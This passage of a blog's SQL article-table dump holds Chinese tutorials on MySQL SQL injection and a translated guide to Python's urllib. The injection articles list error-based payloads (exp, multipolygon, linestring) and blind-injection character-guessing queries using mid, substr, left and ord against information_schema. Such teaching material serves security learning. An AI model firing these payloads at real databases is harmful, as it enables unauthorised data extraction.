user())a)b));</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体"></span><br/></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">7.multipolygon()</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体"></span><br/></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">8.linestring()</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体"></span><br/></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">9.multilinestring()</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体"><br/></span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">10.exp()</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"><span style="font-size:16px;font-family:宋体">select * from test where id=1 and exp(~(select * from(select user())a));</span></p><p style="margin-top:auto;margin-bottom: auto;text-align:left"></p><p>&nbsp;</p><p><br/></p>', 'sql', 1, 14, '2019-04-16', 62, -2, -3, '/upload/image/20190416/57346df54d10a252a0159cbadc847720.jpg'),
	(102, 'sql字符截断', '**', '<p>&nbsp;&nbsp;&nbsp; 在<span style="font-family: Calibri;">sql</span><span style="font-family: 宋体;">注入中，往往会用到截取字符串的问题，例如不回显的情况下进行的注入，也成为盲注，这种情况下往往需要一个一个字符的去猜解，过程中需要用到截取字符串。本文中主要列举三个函数和该函数注入过程中的一些用例。</span><span style="font-family: Calibri;">Ps;</span><span style="font-family: 宋体;">此处用</span><span style="font-family: Calibri;">mysql</span><span style="font-family: 宋体;">进行说明，其他类型数据库请自行检测。</span></p><p>&nbsp;</p><p>三大法宝：<span style="font-family: Calibri;">mid(),substr(),left()</span></p><p><strong>mid()<span style="font-family: 宋体;">函数</span></strong></p><p class="pre">此函数为截取字符串一部分。MID(column_name,start[,length])</p><table width="689"><tbody><tr class="firstRow"><td width="83" valign="top"><p><strong>参数</strong></p></td><td width="262" valign="top"><p><strong>描述</strong></p></td></tr><tr><td width="83" valign="top"><p>column_name</p></td><td width="262" valign="top"><p>必需。要提取字符的字段。</p></td></tr><tr><td width="83" valign="top"><p>start</p></td><td width="262" valign="top"><p>必需。规定开始位置（起始值是 <span style="font-family: Verdana;">1</span><span style="font-family: 宋体;">）。</span></p></td></tr><tr><td width="83" valign="top"><p>length</p></td><td width="262" valign="top"><p>可选。要返回的字符数。如果省略，则 <span style="font-family: Verdana;">MID() </span><span style="font-family: 宋体;">函数返回剩余文本。</span></p></td></tr></tbody></table><p>&nbsp;</p><p>Eg: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str=&quot;123456&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mid(str,2,1)&nbsp;&nbsp;&nbsp;&nbsp;结果为2</p><p>Sql<span style="font-family: 宋体;">用例：</span></p><p>（1）MID(DATABASE(),1,1)&gt;’a’,<span style="font-family: 宋体;">查看数据库名第一位，</span><span style="font-family: Arial;">MID(DATABASE(),2,1)</span><span style="font-family: 宋体;">查看数据库名第二位，依次查看各位字符。</span></p><p>（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处<span style="font-family: Arial;">column_name</span><span style="font-family: 宋体;">参数可以为</span><span style="font-family: Arial;">sql</span><span style="font-family: 宋体;">语句，可自行构造</span><span style="font-family: Arial;">sql</span><span style="font-family: 宋体;">语句进行注入。</span></p><p><strong>&nbsp;</strong><strong>substr()<span style="font-family: 宋体;">函数</span></strong></p><p class="pre">&nbsp;&nbsp;&nbsp;&nbsp;Substr()<span style="font-family: 宋体;">和</span><span style="font-family: Arial;">substring()</span><span style="font-family: 宋体;">函数实现的功能是一样的，均为截取字符串。</span></p><p class="pre">&nbsp;&nbsp;&nbsp;&nbsp;string substring(string, start, length)</p><p class="pre">&nbsp;&nbsp;&nbsp;&nbsp;string substr(string, start, length)</p><p class="pre">&nbsp;&nbsp;&nbsp;&nbsp;参数描述同<span style="font-family: Arial;">mid()</span><span style="font-family: 宋体;">函数，第一个参数为要处理的字符串，</span><span style="font-family: Arial;">start</span><span style="font-family: 宋体;">为开始位置，</span><span style="font-family: Arial;">length</span><span style="font-family: 宋体;">为截取的长度。</span></p><p>Sql<span style="font-family: 宋体;">用例：</span></p><p>(1) substr(DATABASE(),1,1)&gt;’a’,<span style="font-family: 宋体;">查看数据库名第一位，</span><span style="font-family: Arial;">substr(DATABASE(),2,1)</span><span style="font-family: 宋体;">查看数据库名第二位，依次查看各位字符。</span></p><p>(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处<span style="font-family: Arial;">string</span><span style="font-family: 宋体;">参数可以为</span><span style="font-family: Arial;">sql</span><span style="font-family: 宋体;">语句，可自行构造</span><span style="font-family: Arial;">sql</span><span style="font-family: 宋体;">语句进行注入。</span></p><p><strong>L</strong><strong>eft()<span style="font-family: 宋体;">函数</span></strong></p><p class="pre">Left()得到字符串左部指定个数的字符</p><p class="pre">Left ( string, n )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;string<span style="font-family: 宋体;">为要截取的字符串，</span><span style="font-family: Arial;">n</span><span style="font-family: 宋体;">为长度。</span></p><p>Sql<span style="font-family: 宋体;">用例：</span></p><p>(1)&nbsp;left(database(),1)&gt;’a’,<span style="font-family: 宋体;">查看数据库名第一位，</span><span style="font-family: Arial;">left(database(),2)&gt;</span>’ab’,<span style="font-family: 宋体;">查看数据库名前二位。</span></p><p>(2)&nbsp;同样的<span style="font-family: Arial;">string</span><span style="font-family: 宋体;">可以为自行构造的</span><span style="font-family: Arial;">sql</span><span style="font-family: 宋体;">语句。</span></p><p>&nbsp;</p><p>同时也要介绍<span style="font-family: Arial;">ORD()</span><span style="font-family: 宋体;">函数，此函数为返回第一个字符的</span><span style="font-family: Arial;">ASCII</span><span style="font-family: 宋体;">码，经常与上面的函数进行组合使用。</span></p><p>例如<span style="font-family: Arial;">ORD(MID(DATABASE(),1,1))&gt;114 </span><span style="font-family: 宋体;">意为检测</span><span style="font-family: Arial;">database()</span><span style="font-family: 宋体;">的第一位</span><span style="font-family: Arial;">ASCII</span><span style="font-family: 宋体;">码是否大于</span><span style="font-family: Arial;">114</span><span style="font-family: 宋体;">，也即是‘</span><span style="font-family: Arial;">r</span><span style="font-family: 宋体;">’</span></p><p><br/></p>', 'sql', 0, 1, '2019-04-17', 62, -2, 0, '/upload/image/20190417/20c81a62b91afe4b22f4fa06594a958f.jpg'),
	(103, 'python3的urllib', '**', '<h2>介绍</h2><p>改教程翻译自python官网的<a href="https://docs.python.org/3.5/howto/urllib2.html">一篇文档</a>。</p><p><strong>urllib.request</strong>是一个用于访问URL(统一资源定位符)的Python模块。它以<em>urlopen</em>函数的形式提供了一个非常简单的接口，可以访问使用多种不同协议的URL。它也提供了一个稍微复杂一些的接口，用来处理常用的情况——如基本的认证，cookies，代理等等。这些服务由叫做handlers和openers的对象提供。</p><p>urllib.request支持访问多种“URL模式”(模式由URL中“:”前面的字符串确定——比如“ftp”就是“<a href="ftp://python.org/" class="uri">ftp://python.org/</a>”的URL模式)，使用的是它们对应的网络协议(如FTP，HTTP)。这个教程集中于最常用的的类型，HTTP。</p><p>对于直截了当的情况，<em>urlopen</em>很容易使用。但是，一旦你在打开HTTP URL的时候遇到错误或者一些不平常的情况，你就需要对超文本转换协议的一些理解。关于HTTP最全面最权威的参考是<a href="https://tools.ietf.org/html/rfc2616.html">RFC 2616</a>。这是一个技术文档，不太容易阅读。这篇文章的目标就是说明如何使用urllib，包含足够的HTTP协议细节帮助你理解。这篇文章不是要代替urllib.request的<a href="https://docs.python.org/3.5/library/urllib.request.html#module-urllib.request">文档</a>，而是对它的补充。</p><h2>访问URL</h2><p>使用urllib.request最简单的方式如下：</p><pre class="python">import&nbsp;urllib.requestwith&nbsp;urllib.request.urlopen(&#39;http://python.org/&#39;)&nbsp;as&nbsp;response:\r\n&nbsp;&nbsp;&nbsp;&nbsp;html&nbsp;=&nbsp;response.read()</pre><p>如果你想利用url下载一个资源并把它存储在一个临时文件中，你可以利用<code>urlretrieve()</code>函数：</p><pre class="python">import&nbsp;urllib.request\r\nlocal_filename,headers&nbsp;=&nbsp;urllib.request.urlretrieve(&#39;http://pythpn.org/&#39;)\r\nhtml&nbsp;=&nbsp;open(local_filename)</pre><p>下图是演示效果：</p><p><img src="/upload/image/20190417/1555481534184329.png" alt="urlretrieve"/></p><p>uellib的很多用法就是这么简单(注意除了‘http:’类型的url，我们也可以使用以‘ftp:’、‘file:’等开头的url)。然而，这个教程的目的是解释HTTP中一些更复杂的情形。</p><p>HTTP是基于请求和响应的——客户端发起请求，服务端返回响应。urllib.request用Request类来表示你做出的HTTP请求。它的最简形式就是只指定你需要访问的url。Request对象调用<code>urlopen</code>方法会为这个请求返回一个响应对象。这个响应是一个类文件对象，意味着你可以对其调用<code>.read()</code>方法：</p><pre class="python">import&nbsp;urllib.request\r\n\r\nreq&nbsp;=&nbsp;urllib.request.Request(&#39;http://www.voidspace.org.uk&#39;)with&nbsp;urllib.request.urlopen(req)&nbsp;as&nbsp;response:\r\n&nbsp;&nbsp;&nbsp;the_page&nbsp;=&nbsp;response.read()</pre><p>注意urllib.request使用相同的接口来处理所有类型的url。比如说，你也可以这样发起一个FTP请求：</p><pre class="python">req&nbsp;=&nbsp;urllib.request.urlopen(&#39;ftp://example.com/&#39;)</pre><p>在HTTP的情况下，Request对象还允许你做两件事：第一，你可以传递要发送到服务端的数据；第二，你可以发送关于数据或请求自身的额外信息(元数据)给服务器——这个信息会作为HTTP的“请求头”进行发送。让我们分别看一下。</p><h3>数据</h3><p>有时你想使用HTTP发送数据到一个url(通常这个url会指向一个CGI(通用网关接口，Common Gateway \r\nInterface)脚本或其它网络应用)，这通常使用一个POST请求来完成。这也就是当你提交一份填写好的HTML表单的时候，你的浏览器所做的事情。不是所有的POST请求都来自表单:你可以使用POST方式把任意的数据发送到你自己的应用。在常见的HTML表单情况中，数据需要用标准方式进行编码，然后作为<code>data</code>参数传递给Request对象。编码是使用一个<a href="https://docs.python.org/3.5/library/urllib.parse.html#module-urllib.parse">urllib.parse库</a>中的函数完成的。</p><pre class="python">import&nbsp;urllib.parseimport&nbsp;urllib.request\r\n\r\nurl&nbsp;=&nbsp;&#39;http://www.someserver.com/cgi-bin/register.cgi&#39;values&nbsp;=&nbsp;{&#39;name&#39;&nbsp;:&nbsp;&#39;Michael&nbsp;Foord&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;location&#39;&nbsp;:&nbsp;&#39;Northampton&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;language&#39;&nbsp;:&nbsp;&#39;Python&#39;&nbsp;}\r\n\r\ndata&nbsp;=&nbsp;urllib.parse.urlencode(values)\r\ndata&nbsp;=&nbsp;data.encode(&#39;ascii&#39;)&nbsp;#&nbsp;data&nbsp;should&nbsp;be&nbsp;bytesreq&nbsp;=&nbsp;urllib.request.Request(url,&nbsp;data)with&nbsp;urllib.request.urlopen(req)&nbsp;as&nbsp;response:\r\n&nbsp;&nbsp;&nbsp;the_page&nbsp;=&nbsp;response.read()</pre><p>如果不传递<code>data</code>参数，那urllib就会使用GET请求方式。GET方式和POST方式的其中一个区别在于POST请求经常有副作用：它们会以某种方式改变系统的状态(比如，在网上下订单，会有一英担的午餐肉罐头送到你家门口)。尽管HTTP标准明确说POST方式<em>总是</em>会造成副作用，而GET方式<em>从来不会</em>，但是并没有保证措施。数据也可以用GET方式传递，只要把它编码在url中。</p><p>做法如下：</p><pre class="python">&gt;&gt;&gt;&nbsp;import&nbsp;urllib.request&gt;&gt;&gt;&nbsp;import&nbsp;urllib.parse&gt;&gt;&gt;&nbsp;data&nbsp;=&nbsp;{}&gt;&gt;&gt;&nbsp;data[&#39;name&#39;]&nbsp;=&nbsp;&#39;Somebody&nbsp;Here&#39;&gt;&gt;&gt;&nbsp;data[&#39;location&#39;]&nbsp;=&nbsp;&#39;Northampton&#39;&gt;&gt;&gt;&nbsp;data[&#39;language&#39;]&nbsp;=&nbsp;&#39;Python&#39;&gt;&gt;&gt;&nbsp;url_values&nbsp;=&nbsp;urllib.parse.urlencode(data)&gt;&gt;&gt;&nbsp;print(url_values)&nbsp;&nbsp;#&nbsp;The&nbsp;order&nbsp;may&nbsp;differ&nbsp;from&nbsp;below.&nbsp;&nbsp;name=Somebody+Here&amp;language=Python&amp;location=Northampton&gt;&gt;&gt;&nbsp;url&nbsp;=&nbsp;&#39;http://www.example.com/example.cgi&#39;&gt;&gt;&gt;&nbsp;full_url&nbsp;=&nbsp;url&nbsp;+&nbsp;&#39;?&#39;&nbsp;+&nbsp;url_values&gt;&gt;&gt;&nbsp;data&nbsp;=&nbsp;urllib.request.urlopen(full_url)</pre><p>注意full_url 是通过在url后面加一个？，然后再加上编码后的数据进行创建的。</p><h3>头信息</h3><p>我们在这里讨论一个特殊的HTTP头信息，来说明如何在你的HTTP请求中添加头信息。</p><p>一些网站不喜欢被程序访问，或者会给不同的浏览器发送不同的版本。默认情况下，urllib会把自身标记为<code>Python-urllib/x.y</code>(其中x和y表示Python的版本号，如<code>Python-urllib/2.5</code>)，这可能会迷惑网站，或者干脆不起作用。浏览器标识自己的方式就是通过<code>User-agent</code>头信息。当你创建一个Request对象时，你可以传递一个头信息的字典。下面的例子发起的是跟上面一样的请求，但是把自己标识为一个IE浏览器的版本。</p><pre class="python">import&nbsp;urllib.parseimport&nbsp;urllib.request\r\n\r\nurl&nbsp;=&nbsp;&#39;http://www.someserver.com/cgi-bin/register.cgi&#39;user_agent&nbsp;=&nbsp;&#39;Mozilla/5.0&nbsp;(Windows&nbsp;NT&nbsp;6.1;&nbsp;Win64;&nbsp;x64)&#39;values&nbsp;=&nbsp;{&#39;name&#39;:&#39;Michael&nbsp;Foord&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;location&#39;:&#39;Northampton&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;language&#39;:&#39;Python&#39;&nbsp;}\r\nheaders&nbsp;=&nbsp;{&#39;User-Agent&#39;:user_agent}\r\n\r\ndata&nbsp;=&nbsp;urllib.parse.urlencode(values)\r\ndata&nbsp;=&nbsp;data.encode(&#39;ascii&#39;)\r\nreq&nbsp;=&nbsp;urllib.request.Request(url,&nbsp;data,&nbsp;headers)with&nbsp;urllib.request.urlopen(req)&nbsp;as&nbsp;response:\r\n&nbsp;&nbsp;&nbsp;&nbsp;the_page&nbsp;=&nbsp;response.read()</pre><p>这个响应也有两个有用的方法。看<a href="https://www.cnblogs.com/GuoYaxiang/p/6232831.html#info%20和%20geturl">info和geturl</a> 这一节。</p><h2>处理异常</h2><p><em>urlopen</em>在不能处理某个响应的时候会抛出<strong>URLError</strong>(虽然一般使用Python API时，ValueError、TypeError等内建异常也可能被抛出)。</p><p><strong>HTTPError</strong>是<strong>URLError</strong>的子类，在遇到HTTP URL的特殊情况时被抛出。</p><p>异常类出自<code>urllib.error</code>模块。</p><h3>URLError</h3><p>一般来说，<strong>URLError</strong>被抛出是因为没有网络连接(没有到指定服务器的路径)，或者是指定服务器不存在。在这种情况下，抛出的异常将会包含一个‘reason’属性，这是包含一个错误码和一段错误信息的元组。例如</p><pre class="python">&gt;&gt;&gt;&nbsp;req&nbsp;=&nbsp;urllib.request.Request(&#39;http://www.pretend_server.org&#39;)&gt;&gt;&gt;&nbsp;try:&nbsp;urllib.request.urlopen(req)...&nbsp;except&nbsp;urllib.error.URLError&nbsp;as&nbsp;e:...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(e.reason)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n...\r\n(4,&nbsp;&#39;getaddrinfo&nbsp;failed&#39;)</pre><h3>HTTPError</h3><p>每一个来自服务器的HTTP响应都包含一个数字的“状态码”。有时状态码表明服务器不能执行请求。默认的处理程序会为你处理其中的部分响应(比如，如果响应是“重定向”，要求客户端从一个不同的URL中获取资料，那么<code>urllib</code>将会为你处理这个)。对于那些不能处理的响应，<code>urlopen</code>将会抛出一个HTTPError。典型的错误包括‘404’(页面未找到)，‘403’(请求禁止)，和‘401’(请求认证)。</p><p>查看RFC 2616的第10节，作为对所有HTTP错误码的参考。</p><p>抛出的HTTPError实例有一个整型的‘code’属性，对应于服务器发送的错误。</p><h4>错误码</h4><p>因为默认的处理程序会处理重定向问题(范围在300的错误码)，而且范围100-299之间的状态码表示成功，所以你通常只会看到范围在400-599之间的错误码。</p><p><a href="https://docs.python.org/3.5/library/http.server.html#http.server.BaseHTTPRequestHandler.responses"><code>http.server.BaseHTTPRequestHandler.responses</code></a>&nbsp;是一个关于响应码的字典，展示了RFC 2616使用的所有状态码。为了方便，把字典展示如下：</p><pre class="python">#&nbsp;Table&nbsp;mapping&nbsp;response&nbsp;codes&nbsp;to&nbsp;messages;&nbsp;entries&nbsp;have&nbsp;the#&nbsp;form&nbsp;{code:&nbsp;(shortmessage,&nbsp;longmessage)}.responses&nbsp;=&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;100:&nbsp;(&#39;Continue&#39;,&nbsp;&#39;Request&nbsp;received,&nbsp;please&nbsp;continue&#39;),&nbsp;&nbsp;&nbsp;&nbsp;101:&nbsp;(&#39;Switching&nbsp;Protocols&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Switching&nbsp;to&nbsp;new&nbsp;protocol;&nbsp;obey&nbsp;Upgrade&nbsp;header&#39;),&nbsp;&nbsp;&nbsp;&nbsp;200:&nbsp;(&#39;OK&#39;,&nbsp;&#39;Request&nbsp;fulfilled,&nbsp;document&nbsp;follows&#39;),&nbsp;&nbsp;&nbsp;&nbsp;201:&nbsp;(&#39;Created&#39;,&nbsp;&#39;Document&nbsp;created,&nbsp;URL&nbsp;follows&#39;),&nbsp;&nbsp;&nbsp;&nbsp;202:&nbsp;(&#39;Accepted&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Request&nbsp;accepted,&nbsp;processing&nbsp;continues&nbsp;off-line&#39;),&nbsp;&nbsp;&nbsp;&nbsp;203:&nbsp;(&#39;Non-Authoritative&nbsp;Information&#39;,&nbsp;&#39;Request&nbsp;fulfilled&nbsp;from&nbsp;cache&#39;),&nbsp;&nbsp;&nbsp;&nbsp;204:&nbsp;(&#39;No&nbsp;Content&#39;,&nbsp;&#39;Request&nbsp;fulfilled,&nbsp;nothing&nbsp;follows&#39;),&nbsp;&nbsp;&nbsp;&nbsp;205:&nbsp;(&#39;Reset&nbsp;Content&#39;,&nbsp;&#39;Clear&nbsp;input&nbsp;form&nbsp;for&nbsp;further&nbsp;input.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;206:&nbsp;(&#39;Partial&nbsp;Content&#39;,&nbsp;&#39;Partial&nbsp;content&nbsp;follows.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;300:&nbsp;(&#39;Multiple&nbsp;Choices&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Object&nbsp;has&nbsp;several&nbsp;resources&nbsp;--&nbsp;see&nbsp;URI&nbsp;list&#39;),&nbsp;&nbsp;&nbsp;&nbsp;301:&nbsp;(&#39;Moved&nbsp;Permanently&#39;,&nbsp;&#39;Object&nbsp;moved&nbsp;permanently&nbsp;--&nbsp;see&nbsp;URI&nbsp;list&#39;),&nbsp;&nbsp;&nbsp;&nbsp;302:&nbsp;(&#39;Found&#39;,&nbsp;&#39;Object&nbsp;moved&nbsp;temporarily&nbsp;--&nbsp;see&nbsp;URI&nbsp;list&#39;),&nbsp;&nbsp;&nbsp;&nbsp;303:&nbsp;(&#39;See&nbsp;Other&#39;,&nbsp;&#39;Object&nbsp;moved&nbsp;--&nbsp;see&nbsp;Method&nbsp;and&nbsp;URL&nbsp;list&#39;),&nbsp;&nbsp;&nbsp;&nbsp;304:&nbsp;(&#39;Not&nbsp;Modified&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Document&nbsp;has&nbsp;not&nbsp;changed&nbsp;since&nbsp;given&nbsp;time&#39;),&nbsp;&nbsp;&nbsp;&nbsp;305:&nbsp;(&#39;Use&nbsp;Proxy&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;You&nbsp;must&nbsp;use&nbsp;proxy&nbsp;specified&nbsp;in&nbsp;Location&nbsp;to&nbsp;access&nbsp;this&nbsp;&#39;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;resource.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;307:&nbsp;(&#39;Temporary&nbsp;Redirect&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Object&nbsp;moved&nbsp;temporarily&nbsp;--&nbsp;see&nbsp;URI&nbsp;list&#39;),&nbsp;&nbsp;&nbsp;&nbsp;400:&nbsp;(&#39;Bad&nbsp;Request&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Bad&nbsp;request&nbsp;syntax&nbsp;or&nbsp;unsupported&nbsp;method&#39;),&nbsp;&nbsp;&nbsp;&nbsp;401:&nbsp;(&#39;Unauthorized&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;No&nbsp;permission&nbsp;--&nbsp;see&nbsp;authorization&nbsp;schemes&#39;),&nbsp;&nbsp;&nbsp;&nbsp;402:&nbsp;(&#39;Payment&nbsp;Required&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;No&nbsp;payment&nbsp;--&nbsp;see&nbsp;charging&nbsp;schemes&#39;),&nbsp;&nbsp;&nbsp;&nbsp;403:&nbsp;(&#39;Forbidden&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Request&nbsp;forbidden&nbsp;--&nbsp;authorization&nbsp;will&nbsp;not&nbsp;help&#39;),&nbsp;&nbsp;&nbsp;&nbsp;404:&nbsp;(&#39;Not&nbsp;Found&#39;,&nbsp;&#39;Nothing&nbsp;matches&nbsp;the&nbsp;given&nbsp;URI&#39;),&nbsp;&nbsp;&nbsp;&nbsp;405:&nbsp;(&#39;Method&nbsp;Not&nbsp;Allowed&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Specified&nbsp;method&nbsp;is&nbsp;invalid&nbsp;for&nbsp;this&nbsp;server.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;406:&nbsp;(&#39;Not&nbsp;Acceptable&#39;,&nbsp;&#39;URI&nbsp;not&nbsp;available&nbsp;in&nbsp;preferred&nbsp;format.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;407:&nbsp;(&#39;Proxy&nbsp;Authentication&nbsp;Required&#39;,&nbsp;&#39;You&nbsp;must&nbsp;authenticate&nbsp;with&nbsp;&#39;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;this&nbsp;proxy&nbsp;before&nbsp;proceeding.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;408:&nbsp;(&#39;Request&nbsp;Timeout&#39;,&nbsp;&#39;Request&nbsp;timed&nbsp;out;&nbsp;try&nbsp;again&nbsp;later.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;409:&nbsp;(&#39;Conflict&#39;,&nbsp;&#39;Request&nbsp;conflict.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;410:&nbsp;(&#39;Gone&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;URI&nbsp;no&nbsp;longer&nbsp;exists&nbsp;and&nbsp;has&nbsp;been&nbsp;permanently&nbsp;removed.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;411:&nbsp;(&#39;Length&nbsp;Required&#39;,&nbsp;&#39;Client&nbsp;must&nbsp;specify&nbsp;Content-Length.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;412:&nbsp;(&#39;Precondition&nbsp;Failed&#39;,&nbsp;&#39;Precondition&nbsp;in&nbsp;headers&nbsp;is&nbsp;false.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;413:&nbsp;(&#39;Request&nbsp;Entity&nbsp;Too&nbsp;Large&#39;,&nbsp;&#39;Entity&nbsp;is&nbsp;too&nbsp;large.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;414:&nbsp;(&#39;Request-URI&nbsp;Too&nbsp;Long&#39;,&nbsp;&#39;URI&nbsp;is&nbsp;too&nbsp;long.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;415:&nbsp;(&#39;Unsupported&nbsp;Media&nbsp;Type&#39;,&nbsp;&#39;Entity&nbsp;body&nbsp;in&nbsp;unsupported&nbsp;format.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;416:&nbsp;(&#39;Requested&nbsp;Range&nbsp;Not&nbsp;Satisfiable&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Cannot&nbsp;satisfy&nbsp;request&nbsp;range.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;417:&nbsp;(&#39;Expectation&nbsp;Failed&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Expect&nbsp;condition&nbsp;could&nbsp;not&nbsp;be&nbsp;satisfied.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;500:&nbsp;(&#39;Internal&nbsp;Server&nbsp;Error&#39;,&nbsp;&#39;Server&nbsp;got&nbsp;itself&nbsp;in&nbsp;trouble&#39;),&nbsp;&nbsp;&nbsp;&nbsp;501:&nbsp;(&#39;Not&nbsp;Implemented&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Server&nbsp;does&nbsp;not&nbsp;support&nbsp;this&nbsp;operation&#39;),&nbsp;&nbsp;&nbsp;&nbsp;502:&nbsp;(&#39;Bad&nbsp;Gateway&#39;,&nbsp;&#39;Invalid&nbsp;responses&nbsp;from&nbsp;another&nbsp;server/proxy.&#39;),&nbsp;&nbsp;&nbsp;&nbsp;503:&nbsp;(&#39;Service&nbsp;Unavailable&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;The&nbsp;server&nbsp;cannot&nbsp;process&nbsp;the&nbsp;request&nbsp;due&nbsp;to&nbsp;a&nbsp;high&nbsp;load&#39;),&nbsp;&nbsp;&nbsp;&nbsp;504:&nbsp;(&#39;Gateway&nbsp;Timeout&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;The&nbsp;gateway&nbsp;server&nbsp;did&nbsp;not&nbsp;receive&nbsp;a&nbsp;timely&nbsp;response&#39;),&nbsp;&nbsp;&nbsp;&nbsp;505:&nbsp;(&#39;HTTP&nbsp;Version&nbsp;Not&nbsp;Supported&#39;,&nbsp;&#39;Cannot&nbsp;fulfill&nbsp;request.&#39;),\r\n&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p>当错误被抛出时，服务器的响应就是返回一个HTTP错误码和一个错误页面。你可以使用HTTPError实例作为返回页面的响应。这意味着除了‘code’属性外，也可以使用由<code>urllib.response</code>模块返回的read、geturl和info方法。演示如下：</p><pre 